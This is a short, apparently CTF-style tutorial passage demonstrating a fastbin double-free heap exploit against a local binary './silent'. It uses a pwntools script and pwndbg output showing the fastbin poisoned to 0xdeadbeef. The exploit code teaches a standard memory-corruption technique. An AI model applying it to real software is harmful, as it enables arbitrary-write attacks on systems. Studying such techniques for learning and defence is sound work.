## 4.1.5 double_free
write basic framework
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
context.log_level = "debug"
context.binary = "./silent"
elf = context.binary

io = process("./silent")

def add(size, cont):
    io.sendline("1")
    io.sendline(str(size))
    io.send(cont)
    sleep(0.01)

def delete(idx):
    io.sendline("2")
    io.sendline(str(idx))

io.interactive()
```
add 3 chunks, delete 0, 1, 0, then add 3 chunks
```python
add(0x50, '00000000')
add(0x50, '11111111')
add(0x10, '/bin/sh')

delete(0) # 0
delete(1) # 0 -> 1
delete(0) # 0 -> 1 -> 0

add(0x50, flat(0xdeadbeef)) #  1 -> 0 -> 0xdeadbeef
add(0x50, 'aaaaaaaa') # 0 -> 0xdeadbeef
pause()
add(0x50, 'bbbbbbbb') # 0xdeadbeef
```
``````
```
pwndbg> fastbins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x183f000 â—‚â€” 0xdeadbeef
0x70: 0x0
0x80: 0x0
pwndbg> ni
pwndbg> fastbins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0xdeadbeef
0x70: 0x0
0x80: 0x0

```
